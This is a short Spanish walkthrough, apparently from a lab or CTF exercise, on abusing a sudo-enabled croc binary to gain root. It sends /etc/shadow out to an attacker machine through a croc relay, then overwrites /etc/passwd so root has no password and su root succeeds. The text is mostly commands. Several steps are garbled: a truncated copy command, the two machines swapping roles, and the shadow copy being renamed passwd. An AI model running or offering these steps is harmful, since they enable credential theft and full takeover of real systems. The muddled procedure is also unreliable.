Funciona cuando el binario tiene privilegios root.

Croc es una herramienta diseñada para la transferencia segura de archivos entre sistemas, lo que potencialmente permite manipular o exfiltrar archivos sensibles del sistema.

Primero la instalación:

```bash
# Descargar la última versión para Linux (64 bits)
wget https://github.com/schollz/croc/releases/download/v10.3.1/croc_v10.3.1_Linux-64bit.tar.gz

# Descomprimir
tar -xzf croc_v10.3.1_Linux-64bit.tar.gz

# Mover a /usr/local/bin (necesitas sudo)
sudo mv croc /usr/local/bin/

# Dar permisos de ejecución
sudo chmod +x /usr/local/bin/croc

# Verificar instalación
croc -v
```

Ahora si, aprovechando los privilegios sudo del servidor vulnerable, procedemos a transferir el archivo `/etc/shadow` desde la máquina víctima hacia nuestra máquina atacante.

Primero desde la máquina 1 abro un server:

```bash
croc relay
```

Y mando el archivo:

```bash
sudo /usr/local/bin/croc --relay "<IP>:<PUERTO>" send /etc/shadow
```

Ahora desde la máquina 2 inicio el modo receptor:

```bash
croc --relay "<IP>:<PUERTO>"
```

Desde máquina 2 edito el archivo removiendo la “x” de root y vuelvo a mandar el archivo editado a la máquina 1.

Primero hago una copia y después lo edito y cambio el nombre a passwd:

```bash
cp shadow
```

```bash
croc --relay "<IP>:<PUERTO>" send passwd
```

Ahora, desde la máquina 2, ejecutamos el receptor indicando como destino la ruta `/etc/` :

```bash
sudo /usr/local/bin/croc --relay "<IP>:<PUERTO>" --out /etc/
```

Tras la modificación del archivo de autenticación, el usuario `root` queda sin contraseña. Por lo tanto, podemos escalar privilegios ejecutando:

```bash
su root
```

Obtenemos acceso al usuario root.
